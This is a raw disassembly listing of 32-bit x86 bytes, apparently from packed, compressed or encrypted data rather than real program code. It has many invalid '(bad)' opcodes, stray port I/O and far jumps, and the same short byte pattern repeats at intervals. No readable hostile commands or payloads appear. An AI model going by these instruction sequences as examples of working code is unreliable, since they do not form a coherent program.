  42b1ff:	test   al,0xca
  42b201:	jo     0x42b1fb
  42b203:	nop
  42b204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b205:	or     esi,0x558798fe
  42b20b:	pop    ebx
  42b20c:	mov    cl,0x51
  42b20e:	clc    
  42b20f:	inc    cl
  42b211:	and    BYTE PTR ds:0xff8c5613,ah
  42b217:	ins    DWORD PTR es:[edi],dx
  42b218:	sar    BYTE PTR [edi+0x234b63f3],cl
  42b21e:	jmp    DWORD PTR [edi+0x7b7c112a]
  42b224:	mov    edx,0x6abb898c
  42b229:	dec    ecx
  42b22a:	daa    
  42b22b:	jg     0x42b1e9
  42b22d:	or     ecx,ecx
  42b22f:	push   es
  42b230:	adc    al,0xa6
  42b232:	mov    es,WORD PTR [eax+0xed]
	...
  42b294:	add    BYTE PTR [eax],al
  42b296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b297:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b29d:	iret   
  42b29e:	arpl   dx,si
  42b2a0:	or     BYTE PTR [ebp+0x40],ch
  42b2a3:	sbb    eax,0xcdb56193
  42b2a8:	add    DWORD PTR [eax],eax
  42b2aa:	pop    es
  42b2ab:	add    DWORD PTR [eax],eax
  42b2ad:	add    BYTE PTR [esi-0x27b86e97],ah
  42b2b3:	out    0x46,al
  42b2b5:	das    
  42b2b6:	xor    dl,ah
  42b2b8:	jmp    0x28a5:0xea1ab8dc
  42b2bf:	jmp    0x42b27e
  42b2c1:	sub    al,0x7a
  42b2c3:	pop    ds
  42b2c4:	sbb    BYTE PTR [edx],0xdb
  42b2c7:	shl    DWORD PTR [esi],0x99
  42b2ca:	ins    DWORD PTR es:[edi],dx
  42b2cb:	lea    edi,[esi]
  42b2cd:	inc    edi
  42b2ce:	mov    esi,0x294f20b4
  42b2d3:	scas   al,BYTE PTR es:[edi]
  42b2d4:	out    0x83,al
  42b2d6:	jl     0x42b316
  42b2d8:	or     eax,0x6b9e532a
  42b2dd:	neg    BYTE PTR [esi]
  42b2df:	icebp  
  42b2e0:	jg     0x42b328
  42b2e2:	jle    0x42b2db
  42b2e4:	push   esi
  42b2e5:	and    esi,DWORD PTR [ecx]
  42b2e7:	loop   0x42b294
  42b2e9:	icebp  
  42b2ea:	xchg   ebx,eax
  42b2eb:	pop    edi
  42b2ec:	inc    ebp
  42b2ed:	test   eax,0xa3ba2891
  42b2f2:	sub    esp,0xffffff96
  42b2f5:	jl     0x42b32f
  42b2f7:	cli    
  42b2f8:	sub    dh,dl
  42b2fa:	push   eax
  42b2fb:	xor    esi,DWORD PTR [esp+ebp*8+0x39b219e5]
  42b302:	dec    esp
  42b303:	out    0x82,al
  42b305:	xor    al,0x35
  42b307:	inc    ecx
  42b308:	div    ecx
  42b30a:	adc    eax,0x9fab05e3
  42b30f:	dec    edi
  42b310:	loopne 0x42b2c3
  42b312:	add    al,0xf3
  42b314:	hlt    
  42b315:	sub    BYTE PTR [eax],ch
  42b317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b318:	jl     0x42b36d
  42b31a:	dec    eax
  42b31b:	sbb    eax,0x202bd355
  42b320:	js     0x42b35d
  42b322:	add    ecx,DWORD PTR ds:[edx-0x784e6246]
  42b329:	jge    0x42b357
  42b32b:	call   0x2c090dd
  42b330:	inc    esp
  42b331:	sahf   
  42b332:	lods   eax,DWORD PTR ds:[esi]
  42b333:	mov    edx,0x51648598
  42b338:	jo     0x42b31f
  42b33a:	xchg   esi,eax
  42b33b:	lock jnp 0x42b347
  42b33e:	add    eax,0x60e41805
  42b343:	or     ebp,DWORD PTR [edx]
  42b345:	xchg   ecx,eax
  42b346:	push   edi
  42b347:	and    ebx,DWORD PTR [esi]
  42b349:	stos   BYTE PTR es:[edi],al
  42b34a:	and    BYTE PTR [edx],bl
  42b34c:	inc    ebp
  42b34d:	mov    esp,0xc0ebd80c
  42b352:	mov    edx,ss
  42b354:	push   cs
  42b355:	cmp    BYTE PTR [eiz*1+0x7ce62313],bl
  42b35c:	leave  
  42b35d:	pop    esi
  42b35e:	mov    ebp,0xef264959
  42b363:	push   ebp
  42b364:	cmp    DWORD PTR [ecx+ebx*4],ebx
  42b367:	push   0x64186576
  42b36c:	nop
  42b36d:	retf   
  42b36e:	adc    DWORD PTR [esi],ebp
  42b370:	pop    es
  42b371:	push   esi
  42b372:	mov    cl,0xcb
  42b374:	dec    ebp
  42b375:	jmp    0x8a4d:0xcaf0f6d
  42b37c:	or     al,0xef
  42b37e:	and    edx,DWORD PTR [edi]
  42b380:	pushf  
  42b381:	mov    edi,0x73dc59a1
  42b386:	stc    
  42b387:	gs adc eax,0x813f19b0
  42b38d:	loopne 0x42b328
  42b38f:	adc    al,0x79
  42b391:	mov    eax,0xbbf8b09e
  42b396:	aaa    
  42b397:	push   0x4e4d8140
  42b39c:	loop   0x42b404
  42b39e:	fdivr  DWORD PTR [ebx]
  42b3a0:	ds jo  0x42b40d
  42b3a3:	bnd jo 0x42b3c6
  42b3a6:	packuswb mm6,QWORD PTR [edi+0x6b]
  42b3aa:	in     al,0xe1
  42b3ac:	sub    eax,0xc11a3f9c
  42b3b1:	xor    BYTE PTR ds:0x8649,ch
	...
  42b413:	add    BYTE PTR [eax],al
  42b415:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b41b:	out    dx,eax
  42b41c:	into   
  42b41d:	shl    BYTE PTR gs:[esp+esi*8+0x42],0xa0
  42b423:	scas   al,BYTE PTR es:[edi]
  42b424:	mov    DWORD PTR [ecx],esp
  42b426:	mov    esp,0x70001ce
  42b42b:	add    DWORD PTR [eax],eax
  42b42d:	add    BYTE PTR [ecx-0x4d101459],dl
  42b433:	lea    ebp,[eax-0x4b52fb80]
  42b439:	mov    ah,ah
  42b43b:	push   esp
  42b43c:	mov    ebx,0xa24bd246
  42b441:	pop    edx
  42b442:	test   BYTE PTR [edi+0x32],bl
  42b445:	cmc    
  42b446:	or     DWORD PTR [ecx],eax
  42b448:	out    dx,al
  42b449:	je     0x42b40a
  42b44b:	mov    ds:0x506befc6,eax
  42b450:	bound  ebx,QWORD PTR [ebp+ebx*2-0x8]
  42b454:	dec    edi
  42b455:	pop    edi
  42b456:	xchg   ebp,eax
  42b457:	dec    ebx
  42b458:	jo     0x42b4bf
  42b45a:	xchg   esi,eax
  42b45b:	loopne 0x42b422
  42b45d:	(bad)  
  42b45e:	iret   
  42b45f:	aaa    
  42b460:	ror    cl,1
  42b462:	pop    esp
  42b463:	ficom  DWORD PTR [ecx]
  42b465:	xchg   ebx,eax
  42b466:	inc    esi
  42b467:	fldz   
  42b469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b46a:	pop    ebp
  42b46b:	repnz push ecx
  42b46d:	fnstenv [eax-0xb265a18]
  42b473:	sahf   
  42b474:	out    0x2b,al
  42b476:	sbb    al,0xf6
  42b478:	ins    DWORD PTR es:[edi],dx
  42b479:	into   
  42b47a:	pop    edi
  42b47b:	(bad)  
  42b47c:	(bad)  
  42b47d:	in     eax,0xfc
  42b47f:	jno    0x42b49a
  42b481:	imul   DWORD PTR [esi-0x3b83e7ba]
  42b487:	xchg   edi,eax
  42b488:	into   
  42b489:	test   BYTE PTR [edi+ecx*4+0x36],bh
  42b48d:	push   esi
  42b48e:	and    esp,esi
  42b490:	sahf   
  42b491:	f2xm1  
  42b493:	dec    ebp
  42b494:	push   edx
  42b495:	jecxz  0x42b42f
  42b497:	pop    edi
  42b498:	push   ebx
  42b499:	dec    esi
  42b49a:	pop    ebx
  42b49b:	dec    ecx
  42b49c:	or     dl,BYTE PTR [ebp+0xf]
  42b49f:	mov    cl,dl
  42b4a1:	mov    al,0x1d
  42b4a3:	mov    ds:0x88732dce,al
  42b4a8:	and    al,0xd7
  42b4aa:	call   0xf880:0x604ac143
  42b4b1:	cs pop ecx
  42b4b3:	rol    BYTE PTR [edi*2-0x359a50dc],cl
  42b4ba:	dec    ebx
  42b4bb:	mov    bl,0x4a
  42b4bd:	and    bl,al
  42b4bf:	ss adc al,0x6
  42b4c2:	std    
  42b4c3:	sbb    bh,BYTE PTR [ebp+0x4ed1f0b]
  42b4c9:	pop    ecx
  42b4ca:	xor    DWORD PTR [edi],0xa1cc543c
  42b4d0:	inc    ecx
  42b4d1:	xchg   DWORD PTR [ebp+edx*2+0x111abebf],esp
  42b4d8:	scas   al,BYTE PTR es:[edi]
  42b4d9:	jnp    0x42b4d9
  42b4db:	shl    BYTE PTR [esp+edi*8],0x74
  42b4df:	or     dl,BYTE PTR [ebx-0x65d6c4be]
  42b4e5:	test   dh,cl
  42b4e7:	iret   
  42b4e8:	daa    
  42b4e9:	cs pusha 
  42b4eb:	or     al,0xad
  42b4ed:	adc    al,0x23
  42b4ef:	out    dx,eax
  42b4f0:	rcr    eax,0x14
  42b4f3:	push   ss
  42b4f4:	and    BYTE PTR [edi],dh
  42b4f6:	sub    eax,0x21e292ea
  42b4fb:	fild   WORD PTR [esi+eax*8-0x48]
  42b4ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b500:	popf   
  42b501:	out    0x55,eax
  42b503:	mov    dh,0x46
  42b505:	pushf  
  42b506:	jle    0x42b516
  42b508:	pop    ds
  42b509:	and    ebp,ebp
  42b50b:	rcl    ebp,1
  42b50d:	sub    eax,0xfc872a6f
  42b512:	mov    ds:0x61b44e1d,eax
  42b517:	sbb    DWORD PTR [ecx+0x45],edx
  42b51a:	test   BYTE PTR [eax+0x5b4b90e8],al
  42b520:	int3   
  42b521:	rol    BYTE PTR [esi-0x7af5976e],0x8a
  42b528:	fimul  WORD PTR [ecx-0x78]
  42b52b:	push   ss
  42b52c:	jne    0x42b555
  42b52e:	bnd ja 0x42b520
  42b531:	mov    DWORD PTR [edx+0x9ee1],eax
	...
  42b593:	add    BYTE PTR [eax],al
  42b595:	add    al,ah
  42b597:	xchg   esp,eax
  42b598:	and    bh,cl
  42b59a:	je     0x42b59b
  42b59c:	out    dx,eax
  42b59d:	mov    edi,0xcf8f6ca5
  42b5a2:	stos   DWORD PTR es:[edi],eax
  42b5a3:	xchg   edx,eax
  42b5a4:	push   ds
  42b5a5:	test   bl,0xcf
  42b5a8:	add    DWORD PTR [eax],eax
  42b5aa:	pop    es
  42b5ab:	add    DWORD PTR [eax],eax
  42b5ad:	add    BYTE PTR [edi+esi*2],cl
  42b5b0:	sbb    BYTE PTR [ebp-0x36],dh
  42b5b3:	in     al,0x6e
  42b5b5:	dec    ebx
  42b5b6:	ror    ebx,0xef
  42b5b9:	mov    bl,0x54
  42b5bb:	repz dec eax
  42b5bd:	lds    eax,FWORD PTR ds:0xb4af520a
  42b5c3:	mov    ds:0x4d492154,eax
  42b5c8:	mov    cl,0xa1
  42b5ca:	mov    edi,DWORD PTR [edi-0x72bcbf97]
  42b5d0:	retf   
  42b5d1:	adc    ecx,DWORD PTR [esi-0x31a98775]
  42b5d7:	jg     0x42b650
  42b5d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b5da:	jmp    0x15a5:0xa85a89c5
  42b5e1:	push   ss
  42b5e2:	sub    BYTE PTR [esi],dh
  42b5e4:	les    esi,FWORD PTR [ebx-0x33]
  42b5e7:	pop    esp
  42b5e8:	les    eax,FWORD PTR [esi]
  42b5ea:	pop    esi
  42b5eb:	adc    cl,BYTE PTR [esi+0x9ac5662]
  42b5f1:	icebp  
  42b5f2:	ffreep st(6)
  42b5f4:	shl    BYTE PTR [ebp-0x24ec7e78],1
  42b5fa:	lods   al,BYTE PTR ds:[esi]
  42b5fb:	cli    
  42b5fc:	retf   
  42b5fd:	sti    
  42b5fe:	sar    BYTE PTR [edi],1
  42b600:	jge    0x42b67d
  42b602:	fimul  WORD PTR [esp+eax*4]
  42b605:	popf   
  42b606:	jmp    0x49b87b8a
  42b60b:	sbb    al,bl
  42b60d:	loopne 0x42b5a2
  42b60f:	int    0x3f
  42b611:	mov    DWORD PTR [ecx],edi
  42b613:	shr    ebp,cl
  42b615:	mov    esp,0x51e9aafa
  42b61a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b61b:	es lahf 
  42b61d:	jmp    0x42b65c
  42b61f:	ins    DWORD PTR es:[edi],dx
  42b620:	adc    al,0xa0
  42b622:	cdq    
  42b623:	mov    ah,0xd6
  42b625:	cmc    
  42b626:	test   al,0x85
  42b628:	inc    esp
  42b629:	xchg   edi,eax
  42b62a:	add    al,0xf4
  42b62c:	mov    dl,0xe2
  42b62e:	out    0x9e,eax
  42b630:	mov    al,ds:0xa59afb18
  42b635:	sub    ah,BYTE PTR [esi-0x44]
  42b638:	pop    ecx
  42b639:	loope  0x42b634
  42b63b:	adc    al,0xbd
  42b63d:	bound  esi,QWORD PTR [ebp-0x34]
  42b640:	mov    bl,0x67
  42b642:	verr   si
  42b645:	jp     0x42b635
  42b647:	out    dx,eax
  42b648:	cs and cl,dl
  42b64b:	lea    eax,[eax-0xc]
  42b64e:	popa   
  42b64f:	jecxz  0x42b640
  42b651:	fdivr  st,st(0)
  42b653:	fisttp QWORD PTR [ecx-0x57ab8483]
  42b659:	popa   
  42b65a:	mov    dl,0x4d
  42b65c:	jge    0x42b635
  42b65e:	mov    ebp,0xed68c21e
  42b663:	jmp    0x42b6b5
  42b665:	push   ecx
  42b666:	jg     0x42b629
  42b668:	sar    DWORD PTR [edx-0x67c6a049],0xaf
  42b66f:	dec    ebx
  42b670:	enter  0x14f,0x6c
  42b674:	ss mov al,0xd3
  42b677:	in     eax,0xc1
  42b679:	loopne 0x42b617
  42b67b:	int3   
  42b67c:	ins    DWORD PTR es:[edi],dx
  42b67d:	imul   ecx,edi,0x8b0b6951
  42b683:	mov    ebx,DWORD PTR [eax+0x3e]
  42b686:	sbb    eax,ebp
  42b688:	adc    al,al
  42b68a:	pop    ss
  42b68b:	and    al,0x9c
  42b68d:	adc    edx,DWORD PTR [edx+0x63c16de]
  42b693:	mov    ah,0x33
  42b695:	aam    0x5e
  42b697:	enter  0x714e,0xfe
  42b69b:	mov    bl,0xc2
  42b69d:	mov    esp,0x3b7bbcd6
  42b6a2:	loop   0x42b6e8
  42b6a4:	push   edx
  42b6a5:	(bad)  
  42b6a6:	add    eax,DWORD PTR [ecx+0x7c873dc8]
  42b6ac:	or     eax,0x20c94617
  42b6b1:	dec    ebx
  42b6b2:	ins    DWORD PTR es:[edi],dx
  42b6b3:	sub    al,0x53
	...
  42b715:	add    BYTE PTR [esi+0x42],cl
  42b718:	dec    ecx
  42b719:	daa    
  42b71a:	dec    ebp
  42b71b:	das    
  42b71c:	outs   dx,BYTE PTR ds:[esi]
  42b71d:	imul   eax,DWORD PTR [ebx],0xffffffcd
  42b720:	sub    BYTE PTR [ebp-0x29],bl
  42b723:	fbld   TBYTE PTR [ebx+0x1d0caa2]
  42b729:	add    BYTE PTR [edi],al
  42b72b:	add    DWORD PTR [eax],eax
  42b72d:	add    al,dh
  42b72f:	imul   ebx,DWORD PTR [edx],0x549c9d2a
  42b735:	lds    ecx,FWORD PTR [ebx-0x52528abe]
  42b73b:	(bad)  
  42b73c:	xchg   ebx,eax
  42b73d:	(bad)  
  42b73e:	cld    
  42b73f:	push   edx
  42b740:	pop    ebp
  42b741:	cmc    
  42b742:	add    DWORD PTR [ecx],0xffffffa3
  42b745:	adc    BYTE PTR [ebx-0x2],al
  42b748:	out    dx,eax
  42b749:	ins    DWORD PTR es:[edi],dx
  42b74a:	jl     0x42b7a7
  42b74c:	add    BYTE PTR [edx-0x408698ce],cl
  42b752:	xor    BYTE PTR [edi],0x12
  42b755:	inc    ebp
  42b756:	jbe    0x42b6e3
  42b758:	or     cl,BYTE PTR [ebp+0x1e735399]
  42b75e:	jne    0x42b71f
  42b760:	mov    ?,WORD PTR ds:0xe16f9848
  42b766:	(bad)  
  42b767:	xchg   edi,eax
  42b768:	ss mov eax,0x1cd10da9
  42b76e:	xchg   esi,eax
  42b76f:	lds    ebx,FWORD PTR [esi]
  42b771:	repnz fimul DWORD PTR [esp+ecx*4-0x4169de94]
  42b779:	ja     0x42b792
  42b77b:	pop    edi
  42b77c:	add    eax,DWORD PTR [ecx+0x6c9ec1ce]
  42b782:	sub    DWORD PTR [eax+0x116a76e9],ebp
  42b788:	add    eax,0xf2fa1de1
  42b78d:	bnd jo 0x42b744
  42b790:	in     eax,dx
  42b791:	scas   al,BYTE PTR es:[edi]
  42b792:	out    dx,al
  42b793:	mov    esp,0xd11cda5d
  42b798:	sti    
  42b799:	inc    ecx
  42b79a:	aaa    
  42b79b:	mov    bh,0x68
  42b79d:	inc    edx
  42b79e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b79f:	push   eax
  42b7a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b7a1:	sub    al,0x39
  42b7a3:	call   edi
  42b7a5:	cmp    BYTE PTR [edi-0x7d1fa973],cl
  42b7ab:	in     al,0x9c
  42b7ad:	bound  esi,QWORD PTR [eax]
  42b7af:	xchg   esp,eax
  42b7b0:	jmp    0x541b:0xfe4416e0
  42b7b7:	jne    0x42b7de
  42b7b9:	xor    bl,BYTE PTR [esi]
  42b7bb:	and    esp,DWORD PTR [edi+0x71]
  42b7be:	popf   
  42b7bf:	mov    eax,0x6d372160
  42b7c4:	cmp    esi,DWORD PTR [eax-0x27]
  42b7c7:	mul    BYTE PTR [eax-0x4245f6ad]
  42b7cd:	shl    bl,1
  42b7cf:	mov    al,ds:0xcb0bcd71
  42b7d4:	mov    ds:0x52657087,al
  42b7d9:	push   es
  42b7da:	std    
  42b7db:	lods   al,BYTE PTR ds:[esi]
  42b7dc:	lock fidivr WORD PTR [ecx-0x160e829b]
  42b7e3:	add    BYTE PTR [esi-0x56],0x8e
  42b7e7:	fdiv   st,st(3)
  42b7e9:	jno    0x42b7ee
  42b7eb:	je     0x42b786
  42b7ed:	pop    esp
  42b7ee:	or     DWORD PTR [esi-0x60b242b7],edx
  42b7f4:	jo     0x42b778
  42b7f6:	in     al,0x25
  42b7f8:	fidivr WORD PTR fs:[eax+0x34]
  42b7fc:	fs das 
  42b7fe:	scas   eax,DWORD PTR es:[edi]
  42b7ff:	sub    al,0xcd
  42b801:	sahf   
  42b802:	jbe    0x42b7d2
  42b804:	jp     0x42b82e
  42b806:	cli    
  42b807:	sbb    eax,0x302d2320
  42b80c:	jnp    0x42b878
  42b80e:	outs   dx,DWORD PTR ds:[esi]
  42b80f:	pop    edi
  42b810:	push   edi
  42b811:	cmc    
  42b812:	(bad)  
  42b813:	out    dx,eax
  42b814:	stos   BYTE PTR es:[edi],al
  42b815:	cmp    ebp,DWORD PTR [edx+0x27]
  42b818:	aam    0xd3
  42b81a:	push   cs
  42b81b:	popa   
  42b81c:	call   0xc87d:0x48e4b411
  42b823:	mov    al,0x3d
  42b825:	ja     0x42b890
  42b827:	sbb    eax,0x9cfbd725
  42b82c:	cs push ds
  42b82e:	jb     0x42b8a3
  42b830:	sbb    ebx,ecx
  42b832:	out    dx,eax
  42b833:	test   BYTE PTR [ecx+0x0],dh
	...
  42b895:	add    al,ch
  42b897:	popf   
  42b898:	mov    esi,0xf9e7ffe7
  42b89d:	lahf   
  42b89e:	xor    bl,dh
  42b8a0:	add    ecx,DWORD PTR [esi-0xbd1fd2d]
  42b8a6:	rcl    ecx,1
  42b8a8:	add    DWORD PTR [eax],eax
  42b8aa:	pop    es
  42b8ab:	add    DWORD PTR [eax],eax
  42b8ad:	add    BYTE PTR [ebp+eax*1+0x3affd91f],ch
  42b8b4:	push   edi
  42b8b5:	lock ins DWORD PTR es:[edi],dx
  42b8b7:	or     edi,DWORD PTR [edi+0x6d]
  42b8ba:	fs dec ecx
  42b8bc:	stc    
  42b8bd:	retf   0x1b94
  42b8c0:	out    dx,eax
  42b8c1:	addr16 add eax,0xce960af8
  42b8c7:	nop
  42b8c8:	sub    eax,0xd0742eb1
  42b8cd:	icebp  
  42b8ce:	rcl    DWORD PTR [edx+0x567be300],cl
  42b8d4:	sbb    al,0x8c
  42b8d6:	arpl   WORD PTR [ebp+0x13],dx
  42b8d9:	adc    ebx,DWORD PTR [edx-0x31]
  42b8dc:	lds    esi,FWORD PTR [eax+0x73]
  42b8df:	push   es
  42b8e0:	sub    DWORD PTR [esi],edi
  42b8e2:	or     DWORD PTR [esi-0x38],esp
  42b8e5:	mov    cl,0x33
  42b8e7:	popf   
  42b8e8:	dec    esp
  42b8e9:	retf   0xa51a
  42b8ec:	imul   ebx,DWORD PTR [edx-0x7805e574],0xffffffac
  42b8f3:	add    edi,DWORD PTR [edi]
  42b8f5:	or     esi,edx
  42b8f7:	or     ebx,DWORD PTR [edx]
  42b8f9:	into   
  42b8fa:	cmp    al,ah
  42b8fc:	mov    eax,0x3ce0ff1f
  42b901:	les    edx,FWORD PTR [ebx+0x3ffaadc0]
  42b907:	cmp    ebp,esp
  42b909:	cmp    al,0x9e
  42b90b:	pop    ebx
  42b90c:	and    ecx,eax
  42b90e:	jecxz  0x42b909
  42b910:	and    ah,dl
  42b912:	dec    edx
  42b913:	add    al,0xc6
  42b915:	add    eax,0x66d06efc
  42b91a:	push   eax
  42b91b:	movq   mm5,QWORD PTR [ebx]
  42b91e:	pop    esi
  42b91f:	or     DWORD PTR [ebx-0x38],0xa5b2d79d
  42b926:	push   es
  42b927:	cmp    eax,0x351bc8d6
  42b92c:	mov    ecx,0x52272be3
  42b931:	hlt    
  42b932:	add    al,0x9d
  42b934:	loopne 0x42b9b2
  42b936:	and    dh,cl
  42b938:	jb     0x42b95c
  42b93a:	jmp    0x42b8fb
  42b93c:	mov    ecx,0xa2892fb7
  42b941:	adc    bl,BYTE PTR [ebp-0x39]
  42b944:	push   edi
  42b945:	jbe    0x42b9a7
  42b947:	sbb    DWORD PTR [ecx+0x15],eax
  42b94a:	test   DWORD PTR [edx],esp
  42b94c:	imul   DWORD PTR [edi+0x136733ae]
  42b952:	mov    dh,0x1d
  42b954:	pushf  
  42b955:	loope  0x42b9a8
  42b957:	pop    eax
  42b958:	pushf  
  42b959:	outs   dx,BYTE PTR ds:[esi]
  42b95a:	(bad)  
  42b95b:	pop    edx
  42b95c:	(bad)  
  42b95d:	sbb    eax,0xf5d098b9
  42b962:	push   ecx
  42b963:	stos   BYTE PTR es:[edi],al
  42b964:	jmp    0xbce4918f
  42b969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b96a:	fsubr  QWORD PTR [ecx]
  42b96c:	or     DWORD PTR [eax+0x20e0b142],ebx
  42b972:	into   
  42b973:	cmp    DWORD PTR [ebx+0x2d1a26c5],0xffffff90
  42b97a:	fdiv   st,st(6)
  42b97c:	ds (bad) 
  42b97e:	xor    al,0xe7
  42b980:	lahf   
  42b981:	js     0x42b9e2
  42b983:	rcr    BYTE PTR [esi+0x7494bc1a],0x8d
  42b98a:	ss pusha 
  42b98c:	retf   0xe72b
  42b98f:	and    cl,dh
  42b991:	add    al,0x4
  42b993:	cwde   
  42b994:	jbe    0x42b9be
  42b996:	lods   eax,DWORD PTR ds:[esi]
  42b997:	jno    0x42ba0e
  42b999:	mov    eax,ds:0xe27fa75
  42b99e:	jl     0x42b9a1
  42b9a0:	jne    0x42b9d3
  42b9a2:	xor    edi,DWORD PTR [ebp+0x39f12e04]
  42b9a8:	or     DWORD PTR [esi-0x3f],edx
  42b9ab:	clc    
  42b9ac:	out    dx,al
  42b9ad:	push   es
  42b9ae:	repnz or al,0xe0
  42b9b1:	test   ecx,esi
  42b9b3:	(bad)  
  42b9b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  42ba15:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba1b:	neg    ebx
  42ba1d:	outs   dx,DWORD PTR ds:[esi]
  42ba1e:	xor    DWORD PTR [eax-0x80],eax
  42ba21:	fptan  
  42ba23:	imul   BYTE PTR [edi+0x2]
  42ba26:	fcom   st(2)
  42ba28:	add    DWORD PTR [eax],eax
  42ba2a:	pop    es
  42ba2b:	add    DWORD PTR [eax],eax
  42ba2d:	add    BYTE PTR [edx],dh
  42ba2f:	dec    ebx
  42ba30:	push   edx
  42ba31:	cmp    al,0x1
  42ba33:	ds pop es
  42ba35:	add    edi,DWORD PTR [edx-0x10545a5f]
  42ba3b:	adc    edi,DWORD PTR [eax]
  42ba3d:	rcl    DWORD PTR [ebx+0x40ff1b34],1
  42ba43:	or     al,0xdc
  42ba45:	adc    BYTE PTR [ecx+0x6],dh
  42ba48:	jge    0x42ba53
  42ba4a:	pop    esp
  42ba4b:	pop    edi
  42ba4c:	mov    al,ds:0xa95c95dc
  42ba51:	loope  0x42ba88
  42ba53:	adc    al,0xcd
  42ba55:	and    DWORD PTR [ebx-0x760c7af5],edi
  42ba5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba5c:	aam    0x57
  42ba5e:	dec    esi
  42ba5f:	shl    BYTE PTR [ebp-0x74f8a64c],cl
  42ba65:	scas   eax,DWORD PTR es:[edi]
  42ba66:	cmp    BYTE PTR [ebx],dh
  42ba68:	xor    al,0xea
  42ba6a:	sub    edi,DWORD PTR [esi+0x7323c6c1]
  42ba70:	and    bl,BYTE PTR [edi+0x11]
  42ba73:	hlt    
  42ba74:	jl     0x42ba22
  42ba76:	int    0x1e
  42ba78:	jnp    0x42ba0c
  42ba7a:	push   esi
  42ba7b:	ror    DWORD PTR ds:0xce139d42,0x70
  42ba82:	pop    edi
  42ba83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba84:	pop    edi
  42ba85:	mov    esp,0x6b2c527e
  42ba8a:	rcr    DWORD PTR [ecx-0xc9d2057],1
  42ba90:	or     BYTE PTR ds:0x660292b3,bh
  42ba96:	(bad)  
  42ba97:	sti    
  42ba98:	xor    bl,BYTE PTR [edx]
  42ba9a:	xchg   esi,eax
  42ba9b:	push   edx
  42ba9c:	jb     0x42bac6
  42ba9e:	inc    bl
  42baa0:	xchg   esp,esi
  42baa2:	push   0xa91257a0
  42baa7:	pusha  
  42baa8:	mov    WORD PTR [ebp+0x642a73c8],es
  42baae:	xchg   esp,eax
  42baaf:	fld    TBYTE PTR [edi+0x542fe533]
  42bab5:	aas    
  42bab6:	mov    ch,0x36
  42bab8:	xlat   BYTE PTR ds:[ebx]
  42bab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42baba:	in     al,0xf2
  42babc:	mov    dh,0xc8
  42babe:	dec    ecx
  42babf:	in     al,dx
  42bac0:	(bad)  
  42bac1:	or     bl,ch
  42bac3:	adc    dl,al
  42bac5:	lea    edx,[edx-0x7f]
  42bac8:	sbb    DWORD PTR gs:[eax],esp
  42bacb:	cmc    
  42bacc:	push   ebp
  42bacd:	pop    esp
  42bace:	cld    
  42bacf:	cmp    al,0x4f
  42bad1:	out    0xae,eax
  42bad3:	mov    ds:0xfc01c63d,al
  42bad8:	xchg   edi,eax
  42bad9:	int    0x34
  42badb:	mov    dh,0x82
  42badd:	(bad)  
  42bade:	shr    DWORD PTR [ecx-0x27],cl
  42bae1:	inc    edx
  42bae2:	jmp    0x6f61:0x81a2d441
  42bae9:	pop    ecx
  42baea:	jb     0x42babc
  42baec:	push   ss
  42baed:	inc    esi
  42baee:	mov    bl,0xbd
  42baf0:	add    DWORD PTR [ebx],ecx
  42baf2:	inc    esi
  42baf3:	push   ss
  42baf4:	pmaxsw mm0,mm4
  42baf7:	or     eax,0x8481581d
  42bafc:	lods   eax,DWORD PTR ds:[esi]
  42bafd:	pop    esp
  42bafe:	into   
  42baff:	int3   
  42bb00:	fadd   QWORD PTR [ecx+0x34c4e5f9]
  42bb06:	daa    
  42bb07:	and    esp,esp
  42bb09:	loop   0x42baf1
  42bb0b:	fcmove st,st(1)
  42bb0d:	(bad)  
  42bb0f:	bound  ebx,QWORD PTR [edx-0x5636a7bb]
  42bb15:	lock jns 0x42bafc
  42bb18:	sbb    eax,0xfa9e1e76
  42bb1d:	cmc    
  42bb1e:	mov    ds:0x9f94742d,al
  42bb23:	xchg   esp,eax
  42bb24:	sub    BYTE PTR [esi+eax*4-0x60f83d42],0x31
  42bb2c:	lahf   
  42bb2d:	add    BYTE PTR [ecx],ah
  42bb2f:	xchg   esp,eax
  42bb30:	js     0x42bb11
  42bb32:	and    eax,0x4581
	...
  42bb93:	add    BYTE PTR [eax],al
  42bb95:	add    BYTE PTR [eax+ebp*1],dh
  42bb98:	add    DWORD PTR [esi],eax
  42bb9a:	sbb    eax,0x283a372f
  42bb9f:	in     al,0xd1
  42bba1:	and    esp,DWORD PTR [edx+ebx*1-0x2c206946]
  42bba8:	add    DWORD PTR [eax],eax
  42bbaa:	pop    es
  42bbab:	add    DWORD PTR [eax],eax
  42bbad:	add    BYTE PTR [ebx-0x77a2cd61],bh
  42bbb3:	mov    cl,0x93
  42bbb5:	mov    edx,0xf8a1381d
  42bbba:	std    
  42bbbb:	or     al,BYTE PTR [esi-0x76]
  42bbbe:	or     eax,edi
  42bbc0:	leave  
  42bbc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bbc2:	push   ebp
  42bbc3:	sbb    edx,DWORD PTR [eax-0x775f7307]
  42bbc9:	addr16 out dx,eax
  42bbcb:	pop    edx
  42bbcc:	inc    BYTE PTR [esi]
  42bbce:	out    0x8e,al
  42bbd0:	inc    esp
  42bbd1:	popf   
  42bbd2:	fistp  WORD PTR [eax+0x311bafd2]
  42bbd8:	mov    eax,ds:0x1960456a
  42bbdd:	mov    dh,0xf4
  42bbdf:	aam    0xbd
  42bbe1:	push   ebx
  42bbe2:	cmc    
  42bbe3:	cmp    dh,BYTE PTR [edi+ecx*1]
  42bbe6:	inc    ebx
  42bbe7:	or     al,0xd4
